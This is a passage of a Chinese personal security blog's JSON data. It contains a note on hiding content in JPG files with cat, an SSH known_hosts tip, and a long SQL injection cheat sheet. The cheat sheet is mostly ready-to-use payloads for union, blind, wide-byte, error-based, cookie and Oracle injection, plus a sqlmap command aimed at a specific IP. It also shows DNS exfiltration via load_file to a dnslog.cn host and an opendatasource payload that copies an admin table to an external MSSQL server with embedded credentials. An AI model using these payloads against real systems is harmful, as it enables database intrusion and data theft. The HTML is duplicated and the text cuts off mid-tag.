file3.jpg\n```\n\n","slug":"Mac下制作图片马","published":1,"updated":"2021-03-24T07:56:08.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9nm000iicswbwpj25zs","content":"<h2 id=\"0x01-将file1-txt追加到file2-jpg后面：\"><a href=\"#0x01-将file1-txt追加到file2-jpg后面：\" class=\"headerlink\" title=\"0x01 将file1.txt追加到file2.jpg后面：\"></a>0x01 将file1.txt追加到file2.jpg后面：</h2><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">cat</span> file<span class=\"number\">1</span>.txt &gt;&gt; file<span class=\"number\">2</span>.jpg</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x02-将两个文件合并成第三个文件：\"><a href=\"#0x02-将两个文件合并成第三个文件：\" class=\"headerlink\" title=\"0x02 将两个文件合并成第三个文件：\"></a>0x02 将两个文件合并成第三个文件：</h2><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">cat</span> file<span class=\"number\">1</span>.txt file<span class=\"number\">2</span>.jpg &gt;&gt; file<span class=\"number\">3</span>.jpg</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"0x01-将file1-txt追加到file2-jpg后面：\"><a href=\"#0x01-将file1-txt追加到file2-jpg后面：\" class=\"headerlink\" title=\"0x01 将file1.txt追加到file2.jpg后面：\"></a>0x01 将file1.txt追加到file2.jpg后面：</h2><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">cat</span> file<span class=\"number\">1</span>.txt &gt;&gt; file<span class=\"number\">2</span>.jpg</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x02-将两个文件合并成第三个文件：\"><a href=\"#0x02-将两个文件合并成第三个文件：\" class=\"headerlink\" title=\"0x02 将两个文件合并成第三个文件：\"></a>0x02 将两个文件合并成第三个文件：</h2><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">cat</span> file<span class=\"number\">1</span>.txt file<span class=\"number\">2</span>.jpg &gt;&gt; file<span class=\"number\">3</span>.jpg</span><br></pre></td></tr></table></figure>\n\n"},{"title":"Mac终端连接云服务器出错","toc":false,"date":"2021-03-24T07:11:42.000Z","description":null,"_content":"\n删除 `~/.ssh/known_hosts` 即可重新连接成功\n\n","source":"_posts/Mac终端连接云服务器error.md","raw":"---\ntitle: Mac终端连接云服务器出错\ntoc: false\ndate: 2021-03-24 15:11:42\ndescription:\ntags: Mac\ncategories: Mac\n---\n\n删除 `~/.ssh/known_hosts` 即可重新连接成功\n\n","slug":"Mac终端连接云服务器error","published":1,"updated":"2021-03-24T07:31:05.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9no000micsw055fhiux","content":"<p>删除 <code>~/.ssh/known_hosts</code> 即可重新连接成功</p>\n","site":{"data":{}},"excerpt":"","more":"<p>删除 <code>~/.ssh/known_hosts</code> 即可重新连接成功</p>\n"},{"title":"SQL注入","toc":false,"date":"2021-03-24T07:53:00.000Z","description":"SQL注入","_content":"\n## 0x01 SQL注入原理\n\n用户输入的数据被当作代码执行\n\n## 0x02 基本手工注入流程\n\n### 判断注入点\n\n```\n数字型：id=2-1、and 1=1、and 1=2、and -1=-2、and 1>0、or 1=1 ......\n字符型：'、')、'))、)、\"、\")、\"))\n注释符：-- qwe、/**/、#\n```\n\n### 获取字段数\n\n```\norder by n\n```\n\n### 查看回显点\n\n```\nand 1=2 union select 1,2,3,......,n\n```\n\n### 查看数据库名称(假设n是回显点)\n\n```\nand 1=2 union select 1,2,3,......,database()\n```\n\n### 查看表名\n\n```\nand 1=2 union select 1,2,3,......,table_name from information_schema.tables where table_schema = database() limit 0,1    // limit 0,1 0是从哪开始,1是显示几个\n```\n\n### 查看字段名\n\n```\nunion select 1,2,3,......,column_name from information_schema.columns where table_schema = database() and table_name = '表名' limit 0,1\n```\n\n### 查看字段内容\n\n```\nunion select 1,2,3,......,字段名 from 表名 limit 0,1\n```\n\n## **0x03 盲注(布尔盲注、延时盲注)**\n\n在使用and 1=1 和 and 1=2时发现可能存在注入，但是并没有回显点的时候可以尝试使用布尔盲注。\n\n当使用and 1=1 和 and 1=2时发现都出现正确页面，可能存在延时盲注，需要进一步测试\n\n### 函数\n\n1. length()\n\n返回字符串的长度\n\n2. substr()\n\n截取字符串。语法：substr(str,pos,len)\n\n3. ascii()\n\n返回字符的ascii码【将字符变为数字】\n\n4. sleep()\n\n将程序挂起一段时间n，n为n秒\n\n5. if(expr1,expr2,expr3)\n\n判断语句：如果第一个语句正确就执行第二个语句，否则就执行第三个语句\n\n### 布尔盲注\n\n1. 猜解当前数据库名称长度\n\n```\nand (length(database()))>9\n```\n\n2. 利用ASCII码猜解当前数据库名称\n\n```\nand (ascii(substr(database(),1,1)))=115   // 返回正常，说明数据库名称第一位是s\nand (ascii(substr(database(),2,1)))=101    // 返回正常，说明数据库名称第二位是e\n```\n\n3. 猜表名\n\n```\nand (ascii((substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101    // 返回正常，说明数据表名的第一个第一位是e\n```\n\n4. 猜字段名\n\n```\nand (ascii(substr((select column_name from information.columns where table_name='表名' limit 0,1),1,1)))=102    // 返回正常，说明表中的列名称第一位是f\n```\n\n5. 猜内容\n\n```\nand (ascii(substr((select 字段名 from 表名 limit 0,1),1,1)))=122    // 返回正常，说明表中列第一位是z\n```\n\n### 延时盲注\n\n与布尔盲注类似，当注入后无论如何都没有变化时尝试，放在if()函数里面进行，通过有无延时判断是否正确\n\n```\nand if((length(database()))>n,sleep(10),1)\n```\n\n## **0x04 宽字节注入** \n\n### PHP的防御函数\n\nmagic_quotes_gpc(魔术引号开关)使数据库无法闭合注入，PHP5.4以上取消了魔术引号，后续版本有类似功能的函数\n\n这个函数的作用是在PHP中判断解析用户提交的数据，如果有post、get、cookie过来的数据就加上转义字符“\\”，来确保这些数据不会引起程序特别是数据库因为特殊字符引起的污染而出现致命的错误。\n\n单引号、双引号、反斜线与NULL等字符都会被加上反斜线\n\n### 遇到了魔术引号\n\n1. 寻找不需要闭合的注入点\n2. 使用宽字节注入\n\n宽字节SQL注入主要是源于程序员设置数据库编码为非英文编码，那么就有可能产生宽字节注入\n\n发现输入'注释时有\\将之转义，这时在前面加一个%df可以将\\合起来变成一个汉字，从而达到注释的效果。\n\n通过16进制，子查询或者函数来替换有单引号的地方\n\n1. GET注入中在闭合符号前加上%df\n2. POST注入中在闭合符号前加上汉字\n3. 修改brupsuite的hex中对应数的16进制值\n\n## **0x05 报错注入(HEAD注入)**\n\n### **TIPS：只有知道账户密码的时候可用**\n\n### PHP全局变量——超全局变量\n\nPHP中的许多预定义变量都是\"超全局的\"，这意味着它们在一个脚本的全部脚本域中都可以使用。\n\n超全局变量：\n\n- $_REQUEST(获取GET/POST/COOKIE)COOKIE在PHP5.4版本以上已经无法获取了\n- $_POST(获取POST传参)\n- $_GET(获取GET的传参)\n- $_COOKIE(获取COOKIE的值)\n- $_SERVER(包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组)功能强大\n\n常用的：\n\n- $_SERVER['HTTP_REFERER'] 获取Referer请求头数据\n- $_SERVER[\"HTTP_USER_AGENT\"] 获取用户相关信息，包括用户浏览器、操作系统等信息\n- $_SERVER[\"REMOTE_ADDR\"] 浏览网页的用户IP\n\n### 函数\n\nupdatexml()更新xml文档的函数\n\n语法：updatexml(目标xml内容，xml文档路径，更新的内容)\n\n```\nupdatexml(1,concat(0x7e,(SELECT database()),0x7e),1)\nupdatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema = database() limit 0,1),0x7e),1)\nupdatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_schema = database() and table_name = '表名' limit 0,1),0x7e),1)\nupdatexml(1,concat(0x7e,(SELECT 字段名 from 表名 limit 1,1),0x7e),1)\n```\n\n### PS\n\n1. 0x7e 实际是是16进制，Mysql支持16进制，但是开头得写0x  0x7e是一个特殊符号，然后不符合路径规则报错\n2. 有时可以在请求头中加上X-Forwarded-For: 进行注入\n\n## 0x06 Cookie注入\n\n### and等字符被拦截的情况下，asp、aspx、php<=5.4.45可用\n\n开发滥用$_REQUEST引起的，使用Cookie注入需要URL编码\n\n在开发者工具中找到Cookie设置ID和值，再将get传参的?id=1删去，发现还是可以正常访问，说明存在Cookie注入。\n\n### 设置Cookie，需要URL编码\n\n1. 按F12，在浏览器中修改Cookie\n2. 使用BrupSuite抓包修改Cookie，在后面加上; id=171发现和get传参的结果一样\n3. 通过Js，document.cookie=\"id=\"+escape(\"171 order by 1\")\n\nAccess查询必须后带表名，而一开始并不知道表名，union select 1,2,3,4 from 表名，这时有两个办法解决：\n\n- 查询系统自带库【MySQL MsSQL Oracle】都可以这样做，但是Access是淘汰的数据库，所以没办法，只能用第二个办法\n- 强猜 admin news user job,但是Access数据库在使用union select时可能会出错，所以一般使用 and exists (select*from 表名)判断表名，可以利用BurpSuite跑字典跑出表名\n\n之后要查出表内内容有两个办法：\n\n- 强猜，猜测表内有什么字段\n- 偏移注入\n\n### sqlmap跑Cookie注入\n\n```\nsqlmap.py -u \"http://59.63.200.79:8004/shownews.asp\" --cookie \"id=171\" --level 2\n```\n\n## 0x07 偏移注入\n\n### 使用场景\n\n在SQL注入的时候会碰到一些无法查询列名的情况，比如\n\n- 系统自带数据库的权限不够而无法访问系统自带库。\n- 当猜到表名但是无法猜到字段名的时候，可以使用偏移注入来查询表里的数据。\n\n表名.*：*在数据库中代表一切；.代表向下\n\n### 使用步骤\n\n```\nunion select 1,2,3,admin.* from admin    // 放在不同的回显点显示不同的字段的内容，回显点包含在admin.*内\nunion select 1,2,admin.*,10 from admin\n```\n\n## 0x08 DNS注入\n\n### 使用场景\n\n无法直接利用漏洞获得回显，但是目标可以发起请求，此时就可以通过DNS请求的方法将想获得的数据外带出来。\n\n核心：将盲注转化为显错注入\n\nMySQL必须打开`secure_file_priv= ` \n\n### 函数解析\n\nload_file()读取文件\n\n```\nselect load_file('//error.1806dl.dnslog.cn/bc');\nselect load_file(concat('//',(select database()),'.1806dl.dnslog.cn/bc'));\n```\n\ndnslog.cn   // 网站\n\n## **0x9 反弹注入**\n\n### 使用场景\n\n页面没东西显示的盲注\n\n明明是SQL的注入点却无发进行注入，注入工具猜解的速度异常缓慢，错误提示信息关闭，无法返回注入结果等，这些都是在注入攻击中常常遇到的问题。为了解决这些问题，比较好的解决方法是使用反弹注入技术，而反弹注入技术需要依靠opendatasource函数。\n\n反弹注入就是把查询出来的数据发送到我们的MSSQL数据库上，此时就需要自己的MSSQL数据库和一个公网IP。\n\n### 显错注入\n\n1. 猜字段\n2. 联合查询，要写union all select\n3. 输出点要用null填充\n4. 注释只有--+\n5. sysobjects查询系统表 union all select id,name,null from sysobjects where xtype =U --+\n6. syscolumns字段 union all select id,name,null from syscolumns where id=id --+\n7. 查询信息 union all select id,passwd,token from admin --+\n\n### 反弹注入\n\n```\n';insert into opendatasource('sqloledb','server=den1.mssql8.gear.host,1433;uid=xyzxyz;pwd=Ct27!_nXWji4;database=xyzxyz').xyzxyz.dbo.test select * from admin --\n```\n\n## 0x10 报错注入\n\n### Orcale可用\n\ndual是一个虚表，直接查询他只显示一个X，列名为dummy\n\ndual实际上是为了满足查询语句的结构产生的\n\n查询用户名：select user from dual\n\n调用系统函数：(获得随机值：select dbms_random.random from dual)\n\n做加减法： select 9+1 from dual\n\n查询出所有的表：union all select * from all_tables\n\n查询出当前用户的表：select * from user_tables\n\n查询出所有的字段：select * from all_tab_columns\n\n查询出当前用户的字段：select * from user_tab_columns\n\n查版本：select * from v$version\n\nrownum=1 (限制查询返回的总行数为一条)\n\nOracle中<>和!=都是不等于\n\nto_nchar()转换进制\n\n### 报错注入\n\n不用管有没有输出点\n\n不用管数据类型\n\n不用管字段数\n\n```\nctxsys.drithsx.sn(user,(select banner from v$version where rownum = 1))\n```\n\n查询关于主题的对应关键词，然后因为查询失败爆出想要查询的内容\n\n```\nand 1=ctxsys.drithsx.sn(1,(select table_name from user_tables where rownum=1 and table_name<>'NEWS'))\n```\n\n","source":"_posts/SQL注入.md","raw":"---\ntitle: SQL注入\ntoc: false\ndate: 2021-03-24 15:53:00\ndescription: SQL注入\ntags: Web安全\ncategories: Web安全\n---\n\n## 0x01 SQL注入原理\n\n用户输入的数据被当作代码执行\n\n## 0x02 基本手工注入流程\n\n### 判断注入点\n\n```\n数字型：id=2-1、and 1=1、and 1=2、and -1=-2、and 1>0、or 1=1 ......\n字符型：'、')、'))、)、\"、\")、\"))\n注释符：-- qwe、/**/、#\n```\n\n### 获取字段数\n\n```\norder by n\n```\n\n### 查看回显点\n\n```\nand 1=2 union select 1,2,3,......,n\n```\n\n### 查看数据库名称(假设n是回显点)\n\n```\nand 1=2 union select 1,2,3,......,database()\n```\n\n### 查看表名\n\n```\nand 1=2 union select 1,2,3,......,table_name from information_schema.tables where table_schema = database() limit 0,1    // limit 0,1 0是从哪开始,1是显示几个\n```\n\n### 查看字段名\n\n```\nunion select 1,2,3,......,column_name from information_schema.columns where table_schema = database() and table_name = '表名' limit 0,1\n```\n\n### 查看字段内容\n\n```\nunion select 1,2,3,......,字段名 from 表名 limit 0,1\n```\n\n## **0x03 盲注(布尔盲注、延时盲注)**\n\n在使用and 1=1 和 and 1=2时发现可能存在注入，但是并没有回显点的时候可以尝试使用布尔盲注。\n\n当使用and 1=1 和 and 1=2时发现都出现正确页面，可能存在延时盲注，需要进一步测试\n\n### 函数\n\n1. length()\n\n返回字符串的长度\n\n2. substr()\n\n截取字符串。语法：substr(str,pos,len)\n\n3. ascii()\n\n返回字符的ascii码【将字符变为数字】\n\n4. sleep()\n\n将程序挂起一段时间n，n为n秒\n\n5. if(expr1,expr2,expr3)\n\n判断语句：如果第一个语句正确就执行第二个语句，否则就执行第三个语句\n\n### 布尔盲注\n\n1. 猜解当前数据库名称长度\n\n```\nand (length(database()))>9\n```\n\n2. 利用ASCII码猜解当前数据库名称\n\n```\nand (ascii(substr(database(),1,1)))=115   // 返回正常，说明数据库名称第一位是s\nand (ascii(substr(database(),2,1)))=101    // 返回正常，说明数据库名称第二位是e\n```\n\n3. 猜表名\n\n```\nand (ascii((substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101    // 返回正常，说明数据表名的第一个第一位是e\n```\n\n4. 猜字段名\n\n```\nand (ascii(substr((select column_name from information.columns where table_name='表名' limit 0,1),1,1)))=102    // 返回正常，说明表中的列名称第一位是f\n```\n\n5. 猜内容\n\n```\nand (ascii(substr((select 字段名 from 表名 limit 0,1),1,1)))=122    // 返回正常，说明表中列第一位是z\n```\n\n### 延时盲注\n\n与布尔盲注类似，当注入后无论如何都没有变化时尝试，放在if()函数里面进行，通过有无延时判断是否正确\n\n```\nand if((length(database()))>n,sleep(10),1)\n```\n\n## **0x04 宽字节注入** \n\n### PHP的防御函数\n\nmagic_quotes_gpc(魔术引号开关)使数据库无法闭合注入，PHP5.4以上取消了魔术引号，后续版本有类似功能的函数\n\n这个函数的作用是在PHP中判断解析用户提交的数据，如果有post、get、cookie过来的数据就加上转义字符“\\”，来确保这些数据不会引起程序特别是数据库因为特殊字符引起的污染而出现致命的错误。\n\n单引号、双引号、反斜线与NULL等字符都会被加上反斜线\n\n### 遇到了魔术引号\n\n1. 寻找不需要闭合的注入点\n2. 使用宽字节注入\n\n宽字节SQL注入主要是源于程序员设置数据库编码为非英文编码，那么就有可能产生宽字节注入\n\n发现输入'注释时有\\将之转义，这时在前面加一个%df可以将\\合起来变成一个汉字，从而达到注释的效果。\n\n通过16进制，子查询或者函数来替换有单引号的地方\n\n1. GET注入中在闭合符号前加上%df\n2. POST注入中在闭合符号前加上汉字\n3. 修改brupsuite的hex中对应数的16进制值\n\n## **0x05 报错注入(HEAD注入)**\n\n### **TIPS：只有知道账户密码的时候可用**\n\n### PHP全局变量——超全局变量\n\nPHP中的许多预定义变量都是\"超全局的\"，这意味着它们在一个脚本的全部脚本域中都可以使用。\n\n超全局变量：\n\n- $_REQUEST(获取GET/POST/COOKIE)COOKIE在PHP5.4版本以上已经无法获取了\n- $_POST(获取POST传参)\n- $_GET(获取GET的传参)\n- $_COOKIE(获取COOKIE的值)\n- $_SERVER(包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组)功能强大\n\n常用的：\n\n- $_SERVER['HTTP_REFERER'] 获取Referer请求头数据\n- $_SERVER[\"HTTP_USER_AGENT\"] 获取用户相关信息，包括用户浏览器、操作系统等信息\n- $_SERVER[\"REMOTE_ADDR\"] 浏览网页的用户IP\n\n### 函数\n\nupdatexml()更新xml文档的函数\n\n语法：updatexml(目标xml内容，xml文档路径，更新的内容)\n\n```\nupdatexml(1,concat(0x7e,(SELECT database()),0x7e),1)\nupdatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema = database() limit 0,1),0x7e),1)\nupdatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_schema = database() and table_name = '表名' limit 0,1),0x7e),1)\nupdatexml(1,concat(0x7e,(SELECT 字段名 from 表名 limit 1,1),0x7e),1)\n```\n\n### PS\n\n1. 0x7e 实际是是16进制，Mysql支持16进制，但是开头得写0x  0x7e是一个特殊符号，然后不符合路径规则报错\n2. 有时可以在请求头中加上X-Forwarded-For: 进行注入\n\n## 0x06 Cookie注入\n\n### and等字符被拦截的情况下，asp、aspx、php<=5.4.45可用\n\n开发滥用$_REQUEST引起的，使用Cookie注入需要URL编码\n\n在开发者工具中找到Cookie设置ID和值，再将get传参的?id=1删去，发现还是可以正常访问，说明存在Cookie注入。\n\n### 设置Cookie，需要URL编码\n\n1. 按F12，在浏览器中修改Cookie\n2. 使用BrupSuite抓包修改Cookie，在后面加上; id=171发现和get传参的结果一样\n3. 通过Js，document.cookie=\"id=\"+escape(\"171 order by 1\")\n\nAccess查询必须后带表名，而一开始并不知道表名，union select 1,2,3,4 from 表名，这时有两个办法解决：\n\n- 查询系统自带库【MySQL MsSQL Oracle】都可以这样做，但是Access是淘汰的数据库，所以没办法，只能用第二个办法\n- 强猜 admin news user job,但是Access数据库在使用union select时可能会出错，所以一般使用 and exists (select*from 表名)判断表名，可以利用BurpSuite跑字典跑出表名\n\n之后要查出表内内容有两个办法：\n\n- 强猜，猜测表内有什么字段\n- 偏移注入\n\n### sqlmap跑Cookie注入\n\n```\nsqlmap.py -u \"http://59.63.200.79:8004/shownews.asp\" --cookie \"id=171\" --level 2\n```\n\n## 0x07 偏移注入\n\n### 使用场景\n\n在SQL注入的时候会碰到一些无法查询列名的情况，比如\n\n- 系统自带数据库的权限不够而无法访问系统自带库。\n- 当猜到表名但是无法猜到字段名的时候，可以使用偏移注入来查询表里的数据。\n\n表名.*：*在数据库中代表一切；.代表向下\n\n### 使用步骤\n\n```\nunion select 1,2,3,admin.* from admin    // 放在不同的回显点显示不同的字段的内容，回显点包含在admin.*内\nunion select 1,2,admin.*,10 from admin\n```\n\n## 0x08 DNS注入\n\n### 使用场景\n\n无法直接利用漏洞获得回显，但是目标可以发起请求，此时就可以通过DNS请求的方法将想获得的数据外带出来。\n\n核心：将盲注转化为显错注入\n\nMySQL必须打开`secure_file_priv= ` \n\n### 函数解析\n\nload_file()读取文件\n\n```\nselect load_file('//error.1806dl.dnslog.cn/bc');\nselect load_file(concat('//',(select database()),'.1806dl.dnslog.cn/bc'));\n```\n\ndnslog.cn   // 网站\n\n## **0x9 反弹注入**\n\n### 使用场景\n\n页面没东西显示的盲注\n\n明明是SQL的注入点却无发进行注入，注入工具猜解的速度异常缓慢，错误提示信息关闭，无法返回注入结果等，这些都是在注入攻击中常常遇到的问题。为了解决这些问题，比较好的解决方法是使用反弹注入技术，而反弹注入技术需要依靠opendatasource函数。\n\n反弹注入就是把查询出来的数据发送到我们的MSSQL数据库上，此时就需要自己的MSSQL数据库和一个公网IP。\n\n### 显错注入\n\n1. 猜字段\n2. 联合查询，要写union all select\n3. 输出点要用null填充\n4. 注释只有--+\n5. sysobjects查询系统表 union all select id,name,null from sysobjects where xtype =U --+\n6. syscolumns字段 union all select id,name,null from syscolumns where id=id --+\n7. 查询信息 union all select id,passwd,token from admin --+\n\n### 反弹注入\n\n```\n';insert into opendatasource('sqloledb','server=den1.mssql8.gear.host,1433;uid=xyzxyz;pwd=Ct27!_nXWji4;database=xyzxyz').xyzxyz.dbo.test select * from admin --\n```\n\n## 0x10 报错注入\n\n### Orcale可用\n\ndual是一个虚表，直接查询他只显示一个X，列名为dummy\n\ndual实际上是为了满足查询语句的结构产生的\n\n查询用户名：select user from dual\n\n调用系统函数：(获得随机值：select dbms_random.random from dual)\n\n做加减法： select 9+1 from dual\n\n查询出所有的表：union all select * from all_tables\n\n查询出当前用户的表：select * from user_tables\n\n查询出所有的字段：select * from all_tab_columns\n\n查询出当前用户的字段：select * from user_tab_columns\n\n查版本：select * from v$version\n\nrownum=1 (限制查询返回的总行数为一条)\n\nOracle中<>和!=都是不等于\n\nto_nchar()转换进制\n\n### 报错注入\n\n不用管有没有输出点\n\n不用管数据类型\n\n不用管字段数\n\n```\nctxsys.drithsx.sn(user,(select banner from v$version where rownum = 1))\n```\n\n查询关于主题的对应关键词，然后因为查询失败爆出想要查询的内容\n\n```\nand 1=ctxsys.drithsx.sn(1,(select table_name from user_tables where rownum=1 and table_name<>'NEWS'))\n```\n\n","slug":"SQL注入","published":1,"updated":"2021-06-25T08:29:42.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9np000oicsw24oy60rt","content":"<h2 id=\"0x01-SQL注入原理\"><a href=\"#0x01-SQL注入原理\" class=\"headerlink\" title=\"0x01 SQL注入原理\"></a>0x01 SQL注入原理</h2><p>用户输入的数据被当作代码执行</p>\n<h2 id=\"0x02-基本手工注入流程\"><a href=\"#0x02-基本手工注入流程\" class=\"headerlink\" title=\"0x02 基本手工注入流程\"></a>0x02 基本手工注入流程</h2><h3 id=\"判断注入点\"><a href=\"#判断注入点\" class=\"headerlink\" title=\"判断注入点\"></a>判断注入点</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">数字型：<span class=\"attribute\">id</span>=2-1、and <span class=\"attribute\">1</span>=1、and <span class=\"attribute\">1</span>=2、and <span class=\"attribute\">-1</span>=-2、and 1&gt;0、<span class=\"keyword\">or</span> <span class=\"attribute\">1</span>=1 <span class=\"built_in\">..</span><span class=\"built_in\">..</span><span class=\"built_in\">..</span></span><br><span class=\"line\">字符型：<span class=\"string\">&#x27;、&#x27;</span>)、<span class=\"string\">&#x27;))、)、&quot;、&quot;)、&quot;))</span></span><br><span class=\"line\"><span class=\"string\">注释符：-- qwe、/**/、#</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"获取字段数\"><a href=\"#获取字段数\" class=\"headerlink\" title=\"获取字段数\"></a>获取字段数</h3><figure class=\"highlight crmsh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">order</span> <span class=\"title\">by</span> n</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"查看回显点\"><a href=\"#查看回显点\" class=\"headerlink\" title=\"查看回显点\"></a>查看回显点</h3><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">and</span> <span class=\"number\">1</span>=<span class=\"number\">2</span> union select <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,......,n</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"查看数据库名称-假设n是回显点\"><a href=\"#查看数据库名称-假设n是回显点\" class=\"headerlink\" title=\"查看数据库名称(假设n是回显点)\"></a>查看数据库名称(假设n是回显点)</h3><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">and</span> <span class=\"number\">1</span>=<span class=\"number\">2</span> union select <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,......,database()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"查看表名\"><a href=\"#查看表名\" class=\"headerlink\" title=\"查看表名\"></a>查看表名</h3><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">and</span> <span class=\"number\">1</span>=<span class=\"number\">2</span> union select <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,......,table_name from information_schema.tables where table_schema = database() limit <span class=\"number\">0</span>,<span class=\"number\">1</span>    // limit <span class=\"number\">0</span>,<span class=\"number\">1</span> <span class=\"number\">0</span>是从哪开始,<span class=\"number\">1</span>是显示几个</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"查看字段名\"><a href=\"#查看字段名\" class=\"headerlink\" title=\"查看字段名\"></a>查看字段名</h3><figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">union <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,......,column_name <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_schema = <span class=\"keyword\">database</span>() <span class=\"keyword\">and</span> table_name = <span class=\"string\">&#x27;表名&#x27;</span> <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"查看字段内容\"><a href=\"#查看字段内容\" class=\"headerlink\" title=\"查看字段内容\"></a>查看字段内容</h3><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">union</span> select <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,......,字段名 from 表名 limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x03-盲注-布尔盲注、延时盲注\"><a href=\"#0x03-盲注-布尔盲注、延时盲注\" class=\"headerlink\" title=\"0x03 盲注(布尔盲注、延时盲注)\"></a><strong>0x03 盲注(布尔盲注、延时盲注)</strong></h2><p>在使用and 1=1 和 and 1=2时发现可能存在注入，但是并没有回显点的时候可以尝试使用布尔盲注。</p>\n<p>当使用and 1=1 和 and 1=2时发现都出现正确页面，可能存在延时盲注，需要进一步测试</p>\n<h3 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h3><ol>\n<li>length()</li>\n</ol>\n<p>返回字符串的长度</p>\n<ol start=\"2\">\n<li>substr()</li>\n</ol>\n<p>截取字符串。语法：substr(str,pos,len)</p>\n<ol start=\"3\">\n<li>ascii()</li>\n</ol>\n<p>返回字符的ascii码【将字符变为数字】</p>\n<ol start=\"4\">\n<li>sleep()</li>\n</ol>\n<p>将程序挂起一段时间n，n为n秒</p>\n<ol start=\"5\">\n<li>if(expr1,expr2,expr3)</li>\n</ol>\n<p>判断语句：如果第一个语句正确就执行第二个语句，否则就执行第三个语句</p>\n<h3 id=\"布尔盲注\"><a href=\"#布尔盲注\" class=\"headerlink\" title=\"布尔盲注\"></a>布尔盲注</h3><ol>\n<li>猜解当前数据库名称长度</li>\n</ol>\n<figure class=\"highlight isbl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\"><span class=\"keyword\">and</span></span> (<span class=\"function\"><span class=\"title\"><span class=\"built_in\">length</span></span>(<span class=\"title\">database</span>()))&gt;<span class=\"number\">9</span></span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>利用ASCII码猜解当前数据库名称</li>\n</ol>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">and</span> (ascii(substr(database(),<span class=\"number\">1</span>,<span class=\"number\">1</span>)))=<span class=\"number\">115</span>   // 返回正常，说明数据库名称第一位是s</span><br><span class=\"line\"><span class=\"attribute\">and</span> (ascii(substr(database(),<span class=\"number\">2</span>,<span class=\"number\">1</span>)))=<span class=\"number\">101</span>    // 返回正常，说明数据库名称第二位是e</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>猜表名</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">and</span> (ascii((substr(<span class=\"keyword\">select</span> <span class=\"built_in\">table_name</span> <span class=\"keyword\">from</span> information_schema.<span class=\"keyword\">tables</span> <span class=\"keyword\">where</span> table_schema=<span class=\"keyword\">database</span>() <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">1</span>,<span class=\"number\">1</span>)))=<span class=\"number\">101</span>    // 返回正常，说明数据表名的第一个第一位是e</span><br></pre></td></tr></table></figure>\n\n<ol 